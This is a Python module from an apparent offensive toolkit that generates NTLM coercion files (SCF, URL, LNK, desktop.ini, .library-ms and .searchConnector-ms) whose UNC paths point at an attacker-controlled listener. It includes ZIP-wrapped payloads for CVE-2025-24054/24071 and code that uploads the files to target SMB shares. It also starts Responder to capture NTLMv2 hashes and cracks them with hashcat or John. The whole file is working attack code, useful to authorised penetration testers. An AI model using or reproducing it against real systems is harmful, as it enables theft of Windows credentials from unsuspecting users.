"""
NTLM Coercion File Generator
Uses ntlm_theft to create malicious files for NTLM hash capture

Includes CVE-2025-24054 / CVE-2025-24071 exploitation:
- CVE-2025-24054: NTLM hash disclosure via .library-ms (triggers on ZIP extraction)
- CVE-2025-24071: NTLM hash disclosure via spoofed file in Explorer (triggers on preview)
"""

import os
import glob
import struct
import zipfile
import tempfile
import time
import threading
import signal
from core.module_base import ModuleBase, ModuleType, Platform, find_tool


class NTLMCoerce(ModuleBase):
    """
    Generate malicious files that trigger NTLM authentication
    when a user browses to a share containing them.
    Uses ntlm_theft (https://github.com/Greenwolf/ntlm_theft) for file generation.
    Works with Responder/ntlmrelayx for hash capture.
    """

    def __init__(self):
        super().__init__()
        self.name = "ntlm_coerce"
        self.description = "Generate NTLM coercion files using ntlm_theft"
        self.author = "UwU Toolkit"
        self.version = "2.0.0"
        self.module_type = ModuleType.AUXILIARY
        self.platform = Platform.WINDOWS
        self.tags = ["ntlm", "coercion", "scf", "lnk", "responder", "hash", "capture", "ntlm_theft"]
        self.references = [
            "https://github.com/Greenwolf/ntlm_theft",
            "https://book.hacktricks.xyz/windows-hardening/ntlm/places-to-steal-ntlm-creds",
            "https://github.com/helidem/CVE-2025-24054_CVE-2025-24071-PoC",
            "CVE-2025-24054",
            "CVE-2025-24071"
        ]

        # Options
        self.register_option("LHOST", "Listener IP (your Responder IP)", required=True)
        self.register_option("FILENAME", "Base filename for generated files", default="@important")
        self.register_option("FILE_TYPE", "File types to generate",
                           default="all",
                           choices=["all", "lnk", "scf", "url", "docx", "xlsx", "pdf", "cve-2025-24054"])
        self.register_option("OUTPUT_DIR", "Output directory for files", default="ntlm_theft_output")
        self.register_option("CREATE_ZIP", "Wrap files in ZIP (for CVE-2025-24054 extraction trigger)",
                           default="no", choices=["yes", "no"])
        self.register_option("SHARE_NAME", "SMB share name for UNC path", default="share")

        # Upload options
        self.register_option("UPLOAD", "Upload to target share", default="no", choices=["yes", "no"])
        self.register_option("RHOSTS", "Target host for upload", default="")
        self.register_option("SHARE", "Share name for upload", default="")
        self.register_option("REMOTE_PATH", "Remote path within share (optional)", default="")
        self.register_option("USER", "Username for SMB auth", default="")
        self.register_option("PASS", "Password for SMB auth", default="")
        self.register_option("DOMAIN", "Domain for SMB auth", default="")

        # Auto-capture and crack options
        self.register_option("AUTO_RESPONDER", "Start Responder automatically", default="no", choices=["yes", "no"])
        self.register_option("INTERFACE", "Network interface for Responder", default="tun0")
        self.register_option("AUTO_CRACK", "Automatically crack captured hashes", default="no", choices=["yes", "no"])
        self.register_option("WORDLIST", "Wordlist for hash cracking", default="/usr/share/wordlists/rockyou.txt")
        self.register_option("WAIT_TIME", "Seconds to wait for hash capture (0=don't wait)", default="60")

        # Internal state
        self._responder_proc = None
        self._captured_hashes = set()
        self._hash_monitor_thread = None
        self._stop_monitoring = False


    def run(self) -> bool:
        lhost = self.get_option("LHOST")
        filename = self.get_option("FILENAME")
        file_type = self.get_option("FILE_TYPE")
        output_dir = self.get_option("OUTPUT_DIR")
        create_zip = self.get_option("CREATE_ZIP") == "yes"
        share_name = self.get_option("SHARE_NAME")
        auto_responder = self.get_option("AUTO_RESPONDER") == "yes"
        auto_crack = self.get_option("AUTO_CRACK") == "yes"
        interface = self.get_option("INTERFACE")
        wait_time = int(self.get_option("WAIT_TIME"))
        wordlist = self.get_option("WORDLIST")

        # Resolve output path using WORKING_DIR
        if self._config:
            output_dir = self._config.resolve_path(output_dir)

        os.makedirs(output_dir, exist_ok=True)

        self.print_status(f"Listener IP: {lhost}")
        self.print_status(f"Filename: {filename}")
        self.print_status(f"File types: {file_type}")
        self.print_status(f"Output: {output_dir}")
        if create_zip:
            self.print_status("ZIP wrapping: enabled (CVE-2025-24054 extraction trigger)")
        if auto_responder:
            self.print_status(f"Auto-Responder: enabled on {interface}")
        if auto_crack:
            self.print_status(f"Auto-Crack: enabled with {wordlist}")
        self.print_line()

        # Start Responder if requested
        if auto_responder:
            if not self._start_responder(interface):
                self.print_warning("Failed to start Responder, continuing without it...")
            else:
                # Start monitoring for hashes
                self._start_hash_monitor()

        # Handle CVE-2025-24054 specific generation
        if file_type == "cve-2025-24054":
            self.print_status("Generating CVE-2025-24054 / CVE-2025-24071 payload...")
            success = self._generate_cve_2025_24054(lhost, filename, output_dir, share_name)
            if success:
                generated = self._list_generated_files(output_dir, filename)
                # Always create ZIP for this CVE as it triggers on extraction
                create_zip = True
        else:
            # Run ntlm_theft
            success = self._run_ntlm_theft(lhost, filename, file_type, output_dir)
            if not success:
                self._cleanup_responder()
                return False

            # Also generate CVE-2025-24054 payloads when using "all"
            if file_type == "all":
                self.print_line()
                self.print_status("Also generating CVE-2025-24054 / CVE-2025-24071 payloads...")
                self._generate_cve_2025_24054(lhost, filename, output_dir, share_name)

            generated = self._list_generated_files(output_dir, filename)

        if not generated:
            self.print_warning("No files found in output directory")
            self._cleanup_responder()
            return False

        self.print_line()
        self.print_good(f"Generated {len(generated)} file(s):")
        for f in generated:
            self.print_line(f"  {os.path.basename(f)}")

        # Create ZIP if requested (critical for CVE-2025-24054)
        if create_zip:
            zip_path = self._create_payload_zip(generated, output_dir, filename)
            if zip_path:
                self.print_line()
                self.print_good(f"Created ZIP payload: {os.path.basename(zip_path)}")
                self.print_status("CVE-2025-24054: NTLM auth triggers when victim extracts the ZIP")
                generated.append(zip_path)

        # Upload if requested
        if self.get_option("UPLOAD") == "yes" and generated:
            self._upload_files(generated)

        # Wait for hash capture if auto-responder is running
        if auto_responder and wait_time > 0:
            self.print_line()
            self.print_status(f"Waiting up to {wait_time}s for hash capture (Ctrl+C to stop)...")
            captured = self._wait_for_hashes(wait_time)

            if captured and auto_crack:
                self.print_line()
                self._crack_hashes(captured, wordlist)

            self._cleanup_responder()
        elif not auto_responder:
            self.print_line()
            self.print_status("Start Responder before user browses to share:")
            self.print_line(f"  responder -I {interface} -v")
            self.print_line()
            self.print_status("Or use ntlmrelayx for relay attacks:")
            self.print_line(f"  ntlmrelayx.py -tf targets.txt -smb2support")

        return True

    def _run_ntlm_theft(self, lhost: str, filename: str, file_type: str, output_dir: str) -> bool:
        """Run ntlm_theft to generate coercion files"""

        # Map our file_type to ntlm_theft's --generate option
        gen_type = file_type if file_type != "all" else "all"

        # Try ntlm_theft in Exegol (use its venv python)
        self.print_status("Running ntlm_theft...")
        # ntlm_theft has its own venv with xlsxwriter installed
        ntlm_theft_python = "/opt/tools/ntlm_theft/venv/bin/python3"
        ntlm_theft_script = "/opt/tools/ntlm_theft/ntlm_theft.py"
        cmd = f"{ntlm_theft_python} {ntlm_theft_script} --generate {gen_type} --server {lhost} --filename {filename}"

        # ntlm_theft outputs to current directory, so we cd first
        full_cmd = f"cd {output_dir} && {cmd}"

        ret = self.run_in_exegol_stream(full_cmd, timeout=60)

        if ret == 0:
            self.print_good("ntlm_theft completed successfully")
            return True

        # Fallback to manual generation
        self.print_warning("ntlm_theft failed, generating files manually...")
        return self._generate_files_fallback(lhost, filename, output_dir)

    def _list_generated_files(self, output_dir: str, filename: str = None) -> list:
        """List all generated coercion files (checks subdirectories too)"""
        extensions = ['.lnk', '.scf', '.url', '.docx', '.xlsx', '.pdf',
                      '.xml', '.htm', '.html', '.library-ms', '.searchConnector-ms',
                      '.settingcontent-ms', '.wax', '.asx', '.m3u', '.rtf',
                      '.jnlp', '.application', '.theme', '.inf']

        generated = []

        # Directories to check - ntlm_theft creates a subdirectory named after filename
        dirs_to_check = [output_dir]
        if filename:
            subdir = os.path.join(output_dir, filename)
            if os.path.isdir(subdir):
                dirs_to_check.append(subdir)

        # Also check any subdirectory in output_dir
        try:
            for item in os.listdir(output_dir):
                item_path = os.path.join(output_dir, item)
                if os.path.isdir(item_path) and item_path not in dirs_to_check:
                    dirs_to_check.append(item_path)
        except Exception:
            pass

        for check_dir in dirs_to_check:
            try:
                for f in os.listdir(check_dir):
                    filepath = os.path.join(check_dir, f)
                    if not os.path.isfile(filepath):
                        continue
                    # Check if file matches any extension
                    if any(f.lower().endswith(ext) for ext in extensions):
                        generated.append(filepath)
                    # Also check for desktop.ini and Autorun.inf
                    elif f.lower() in ['desktop.ini', 'autorun.inf']:
                        generated.append(filepath)
            except Exception as e:
                self.print_warning(f"Could not list files in {check_dir}: {e}")

        return sorted(generated)

    def _generate_files_fallback(self, lhost: str, filename: str, output_dir: str) -> bool:
        """Fallback: Generate coercion files manually if ntlm_theft not available"""

        # Ensure filename starts with @ for sorting
        if not filename.startswith("@"):
            filename = "@" + filename

        # SCF file
        scf_content = f"""[Shell]
Command=2
IconFile=\\\\{lhost}\\share\\icon.ico
[Taskbar]
Command=ToggleDesktop
"""
        scf_path = os.path.join(output_dir, f"{filename}.scf")
        with open(scf_path, 'w') as f:
            f.write(scf_content)

        # URL file
        url_content = f"""[InternetShortcut]
URL=file://{lhost}/share
IconIndex=0
IconFile=\\\\{lhost}\\share\\icon.ico
"""
        url_path = os.path.join(output_dir, f"{filename}.url")
        with open(url_path, 'w') as f:
            f.write(url_content)

        # LNK file
        lnk_path = os.path.join(output_dir, f"{filename}.lnk")
        self._generate_lnk(lhost, lnk_path)

        # desktop.ini
        ini_content = f"""[.ShellClassInfo]
IconResource=\\\\{lhost}\\share\\icon.ico,0
"""
        ini_path = os.path.join(output_dir, "desktop.ini")
        with open(ini_path, 'w') as f:
            f.write(ini_content)

        # library-ms
        library_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>\\\\{lhost}\\share\\icon.ico</iconReference>
  <templateInfo>
    <folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\\\{lhost}\\share</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
"""
        lib_path = os.path.join(output_dir, f"{filename}.library-ms")
        with open(lib_path, 'w') as f:
            f.write(library_content)

        # searchConnector-ms
        search_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
    <iconReference>\\\\{lhost}\\share\\icon.ico</iconReference>
    <description>Search Connector</description>
    <isSearchOnlyItem>false</isSearchOnlyItem>
    <includeInStartMenuScope>true</includeInStartMenuScope>
    <templateInfo>
        <folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
    </templateInfo>
    <simpleLocation>
        <url>\\\\{lhost}\\share</url>
    </simpleLocation>
</searchConnectorDescription>
"""
        search_path = os.path.join(output_dir, f"{filename}.searchConnector-ms")
        with open(search_path, 'w') as f:
            f.write(search_content)

        return True

    def _generate_lnk(self, lhost: str, output_path: str) -> None:
        """Generate a Windows LNK file with UNC icon path for NTLM coercion"""
        unc_path = f"\\\\{lhost}\\share\\icon.ico"

        header_clsid = bytes([
            0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46
        ])

        link_flags = 0x000000C1
        file_attrs = 0x00000000
        times = b'\x00' * 24
        file_size = 0
        icon_index = 0
        show_cmd = 1
        reserved = b'\x00' * 10

        header = struct.pack('<I', 76)
        header += header_clsid
        header += struct.pack('<I', link_flags)
        header += struct.pack('<I', file_attrs)
        header += times
        header += struct.pack('<I', file_size)
        header += struct.pack('<i', icon_index)
        header += struct.pack('<I', show_cmd)
        header += reserved

        clsid_mycomputer = bytes([
            0x14, 0x00, 0x1F, 0x50,
            0xE0, 0x4F, 0xD0, 0x20, 0xEA, 0x3A, 0x69, 0x10,
            0xA2, 0xD8, 0x08, 0x00, 0x2B, 0x30, 0x30, 0x9D
        ])
        terminal = bytes([0x00, 0x00])

        id_list_size = len(clsid_mycomputer) + len(terminal)
        link_target_id_list = struct.pack('<H', id_list_size) + clsid_mycomputer + terminal

        icon_location_unicode = unc_path.encode('utf-16-le')
        icon_location_size = len(unc_path)
        string_data = struct.pack('<H', icon_location_size) + icon_location_unicode

        lnk_data = header + link_target_id_list + string_data

        with open(output_path, 'wb') as f:
            f.write(lnk_data)

    def _upload_files(self, files: list) -> None:
        """Upload generated files to target share using impacket's smbclient.py"""
        target = self.get_option("RHOSTS")
        share = self.get_option("SHARE")
        remote_path = self.get_option("REMOTE_PATH")
        user = self.get_option("USER")
        password = self.get_option("PASS")
        domain = self.get_option("DOMAIN")

        if not all([target, share, user, password]):
            self.print_warning("Missing upload options (RHOSTS, SHARE, USER, PASS)")
            return

        self.print_line()
        self.print_status(f"Uploading to \\\\{target}\\{share}...")

        # Use impacket's smbclient.py (more reliable with NTLM auth)
        for filepath in files:
            filename = os.path.basename(filepath)

            # Determine remote filename (with path if specified)
            if remote_path:
                remote_file = f"{remote_path}/{filename}"
            else:
                remote_file = filename

            success = self._upload_with_impacket(target, share, user, password, domain, filepath, remote_file)

            if not success:
                # Fallback to samba's smbclient
                self._upload_with_smbclient(target, share, user, password, domain, filepath, remote_file)

    def _upload_with_impacket(self, target: str, share: str, user: str, password: str,
                               domain: str, local_path: str, remote_file: str) -> bool:
        """Upload using impacket's smbclient.py"""
        filename = os.path.basename(local_path)

        # Build auth string
        if domain:
            auth_string = f"{domain}/{user}:{password}@{target}"
        else:
            auth_string = f"{user}:{password}@{target}"

        # SMB commands to execute (put uses basename automatically)
        smb_commands = f"use {share}\nput {local_path}\nexit\n"

        # Create a Python helper script to bypass shell escaping issues
        # This runs subprocess directly without shell interpretation
        helper_script = f'''#!/usr/bin/env python3
import subprocess
import sys

auth = {repr(auth_string)}
commands = {repr(smb_commands)}

smbclient_paths = [
    "/root/.local/bin/smbclient.py",
    "/usr/local/bin/smbclient.py",
]

for path in smbclient_paths:
    try:
        result = subprocess.run(
            [path, auth],
            input=commands.encode(),
            capture_output=True,
            timeout=60
        )
        print(result.stdout.decode(), end="")
        print(result.stderr.decode(), end="", file=sys.stderr)
        sys.exit(result.returncode)
    except FileNotFoundError:
        continue
    except Exception as e:
        print(f"Error: {{e}}", file=sys.stderr)
        sys.exit(1)

print("smbclient.py not found", file=sys.stderr)
sys.exit(1)
'''

        try:
            # Write helper script
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(helper_script)
                helper_path = f.name

            # Run the helper script
            cmd = f"python3 {helper_path}"
            ret, stdout, stderr = self.run_in_exegol(cmd, timeout=60)

            # Clean up
            try:
                os.unlink(helper_path)
            except Exception:
                pass

            # Check for success
            output = stdout + stderr
            if "STATUS_" in output and "FAILURE" in output:
                self.print_error(f"  Auth failed: {filename}")
                return False
            elif ret == 0 or "putting file" in output.lower() or remote_file in output:
                self.print_good(f"  Uploaded: {filename}")
                return True
            else:
                return False

        except Exception as e:
            self.print_error(f"  Impacket upload error: {e}")
            return False

    def _upload_with_smbclient(self, target: str, share: str, user: str, password: str,
                                domain: str, local_path: str, remote_file: str) -> bool:
        """Fallback upload using samba's smbclient"""
        filename = os.path.basename(local_path)

        # Build auth for smbclient
        if domain:
            auth = f"{domain}/{user}%{password}"
        else:
            auth = f"{user}%{password}"

        cmd = f"smbclient '//{target}/{share}' -U '{auth}' -c 'put {local_path} {remote_file}'"
        ret, stdout, stderr = self.run_in_exegol(cmd, timeout=30)

        if ret == 0 and "NT_STATUS" not in stderr:
            self.print_good(f"  Uploaded: {filename}")
            return True
        else:
            self.print_error(f"  Failed: {filename}")
            return False

    def _generate_cve_2025_24054(self, lhost: str, filename: str, output_dir: str, share_name: str) -> bool:
        """
        Generate CVE-2025-24054 / CVE-2025-24071 specific payloads.

        CVE-2025-24054: NTLM hash disclosure via .library-ms (triggers on ZIP extraction)
        CVE-2025-24071: NTLM hash disclosure via file preview in Explorer

        The .library-ms file triggers NTLM authentication when:
        - Extracted from a ZIP file (CVE-2025-24054)
        - Previewed in Windows Explorer (CVE-2025-24071)
        """
        unc_path = f"\\\\{lhost}\\{share_name}"

        # Ensure filename is clean
        if not filename.startswith("@"):
            filename = "@" + filename

        # Generate .library-ms (primary CVE-2025-24054 payload)
        library_ms_content = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <simpleLocation>
        <url>{unc_path}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""

        library_path = os.path.join(output_dir, f"{filename}.library-ms")
        with open(library_path, 'w', encoding='utf-8') as f:
            f.write(library_ms_content)
        self.print_good(f"Created: {filename}.library-ms (CVE-2025-24054/24071)")

        # Generate alternative .library-ms with icon reference (for preview trigger)
        library_ms_icon = f"""<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>{unc_path}\\icon.ico</iconReference>
  <templateInfo>
    <folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>{unc_path}</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>"""

        library_icon_path = os.path.join(output_dir, f"{filename}_icon.library-ms")
        with open(library_icon_path, 'w', encoding='utf-8') as f:
            f.write(library_ms_icon)
        self.print_good(f"Created: {filename}_icon.library-ms (icon reference variant)")

        # Generate .searchConnector-ms (related attack vector)
        search_connector = f"""<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <iconReference>{unc_path}\\icon.ico</iconReference>
  <description>Search Connector</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <templateInfo>
    <folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType>
  </templateInfo>
  <simpleLocation>
    <url>{unc_path}</url>
  </simpleLocation>
</searchConnectorDescription>"""

        search_path = os.path.join(output_dir, f"{filename}.searchConnector-ms")
        with open(search_path, 'w', encoding='utf-8') as f:
            f.write(search_connector)
        self.print_good(f"Created: {filename}.searchConnector-ms")

        return True

    def _create_payload_zip(self, files: list, output_dir: str, filename: str) -> str:
        """
        Create a ZIP file containing the payloads.
        Critical for CVE-2025-24054 as it triggers on extraction.
        """
        # Filter to only include .library-ms and .searchConnector-ms files
        target_extensions = ['.library-ms', '.searchConnector-ms']
        payload_files = [f for f in files if any(f.endswith(ext) for ext in target_extensions)]

        if not payload_files:
            payload_files = files  # Fall back to all files if no specific ones found

        zip_filename = f"{filename.lstrip('@')}_payload.zip"
        zip_path = os.path.join(output_dir, zip_filename)

        try:
            with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zf:
                for filepath in payload_files:
                    arcname = os.path.basename(filepath)
                    zf.write(filepath, arcname)
            return zip_path
        except Exception as e:
            self.print_error(f"Failed to create ZIP: {e}")
            return None

    # ==================== Auto-Responder Methods ====================

    def _start_responder(self, interface: str) -> bool:
        """Start Responder in the background"""
        self.print_status(f"Starting Responder on {interface}...")

        # Check if Responder is already running (more robust check)
        ret, stdout, stderr = self.run_in_exegol(
            "ps aux | grep -E 'Responder\\.py.*-I' | grep -v grep | head -1",
            timeout=5
        )
        if ret == 0 and stdout.strip() and 'Responder.py' in stdout:
            self.print_warning("Responder is already running")
            self.print_line(f"  {stdout.strip()[:80]}")
            return True

        # Start Responder in background
        responder_cmd = f"nohup /opt/tools/Responder/venv/bin/python3 /opt/tools/Responder/Responder.py -I {interface} > /tmp/responder.log 2>&1 &"
        ret, stdout, stderr = self.run_in_exegol(responder_cmd, timeout=10)

        # Give it a moment to start
        time.sleep(3)

        # Verify it started
        ret, stdout, stderr = self.run_in_exegol(
            "ps aux | grep -E 'Responder\\.py.*-I' | grep -v grep",
            timeout=5
        )
        if ret == 0 and stdout.strip() and 'Responder.py' in stdout:
            self.print_good("Responder started successfully")
            return True
        else:
            # Check log for errors
            ret, log, _ = self.run_in_exegol("tail -5 /tmp/responder.log 2>/dev/null", timeout=5)
            if log:
                self.print_error(f"Responder failed: {log.strip()}")
            else:
                self.print_error("Failed to start Responder")
            return False

    def _start_hash_monitor(self):
        """Start monitoring Responder logs for new hashes"""
        self._stop_monitoring = False
        self._captured_hashes = set()

        # Get initial hash count
        self._get_existing_hashes()

    def _get_existing_hashes(self) -> set:
        """Get currently captured hashes from Responder logs"""
        hashes = set()
        ret, stdout, stderr = self.run_in_exegol(
            "cat /opt/tools/Responder/logs/*NTLM*.txt 2>/dev/null || true",
            timeout=10
        )
        if stdout:
            for line in stdout.strip().split('\n'):
                if line and '::' in line:
                    hashes.add(line.strip())
        self._captured_hashes = hashes
        return hashes

    def _wait_for_hashes(self, timeout: int) -> list:
        """Wait for new hashes to be captured"""
        initial_hashes = self._captured_hashes.copy()
        new_hashes = []
        start_time = time.time()

        try:
            while time.time() - start_time < timeout:
                current_hashes = self._get_existing_hashes()
                new_ones = current_hashes - initial_hashes

                if new_ones:
                    for h in new_ones:
                        if h not in [nh for nh in new_hashes]:
                            new_hashes.append(h)
                            # Extract username from hash
                            parts = h.split('::')
                            if len(parts) >= 2:
                                user = parts[0]
                                self.print_good(f"Captured hash for: {user}")

                time.sleep(2)

        except KeyboardInterrupt:
            self.print_warning("Hash capture interrupted")

        if new_hashes:
            self.print_line()
            self.print_good(f"Captured {len(new_hashes)} new hash(es)")
        else:
            self.print_warning("No new hashes captured")

        return new_hashes

    def _crack_hashes(self, hashes: list, wordlist: str) -> None:
        """Crack captured NTLMv2 hashes using hashcat"""
        if not hashes:
            return

        self.print_status("Attempting to crack captured hashes...")

        # Write hashes to temp file
        hash_file = "/tmp/ntlm_hashes.txt"
        with tempfile.NamedTemporaryFile(mode='w', suffix='.txt', delete=False) as f:
            for h in hashes:
                f.write(h + '\n')
            hash_file = f.name

        # Copy hash file to container
        # Try hashcat first (mode 5600 = NTLMv2)
        crack_cmd = f"hashcat -m 5600 {hash_file} {wordlist} --force --quiet -O 2>/dev/null"
        self.print_status("Running hashcat (NTLMv2 mode 5600)...")

        ret, stdout, stderr = self.run_in_exegol(crack_cmd, timeout=300)

        if ret == 0:
            # Check for cracked passwords
            show_cmd = f"hashcat -m 5600 {hash_file} --show 2>/dev/null"
            ret, stdout, stderr = self.run_in_exegol(show_cmd, timeout=30)

            if stdout.strip():
                self.print_line()
                self.print_good("Cracked passwords:")
                for line in stdout.strip().split('\n'):
                    if line and ':' in line:
                        self.print_line(f"  {line}")

                        # Try to add to creds database
                        try:
                            parts = line.split(':')
                            if len(parts) >= 2:
                                # NTLMv2 format: user::domain:challenge:response:password
                                user = parts[0]
                                password = parts[-1]
                                if hasattr(self, '_creds') and self._creds:
                                    self._creds.add_credential(
                                        username=user,
                                        password=password,
                                        cred_type="password",
                                        source="ntlm_coerce hashcat"
                                    )
                        except Exception:
                            pass
            else:
                self.print_warning("No passwords cracked (try a bigger wordlist)")
        else:
            # Try john as fallback
            self.print_status("Hashcat failed, trying John the Ripper...")
            john_cmd = f"john --format=netntlmv2 --wordlist={wordlist} {hash_file} 2>/dev/null"
            ret, stdout, stderr = self.run_in_exegol(john_cmd, timeout=300)

            # Show john results
            show_cmd = f"john --format=netntlmv2 --show {hash_file} 2>/dev/null"
            ret, stdout, stderr = self.run_in_exegol(show_cmd, timeout=30)

            if stdout.strip() and "0 password hashes cracked" not in stdout:
                self.print_line()
                self.print_good("Cracked passwords:")
                for line in stdout.strip().split('\n'):
                    if line and ':' in line and 'password hashes cracked' not in line:
                        self.print_line(f"  {line}")
            else:
                self.print_warning("No passwords cracked")

        # Cleanup
        try:
            os.unlink(hash_file)
        except Exception:
            pass

    def _cleanup_responder(self):
        """Stop Responder and cleanup"""
        self._stop_monitoring = True

        # Kill Responder processes we started
        ret, stdout, stderr = self.run_in_exegol(
            "pkill -f 'Responder.py.*-I' 2>/dev/null; rm -f /tmp/responder.log 2>/dev/null; true",
            timeout=5
        )
        self.print_status("Responder stopped")

    def check(self) -> bool:
        """Check if ntlm_theft is available"""
        ret, stdout, stderr = self.run_in_exegol(
            "test -f /opt/tools/ntlm_theft/ntlm_theft.py && python3 -c 'import xlsxwriter' 2>/dev/null",
            timeout=10
        )
        return ret == 0
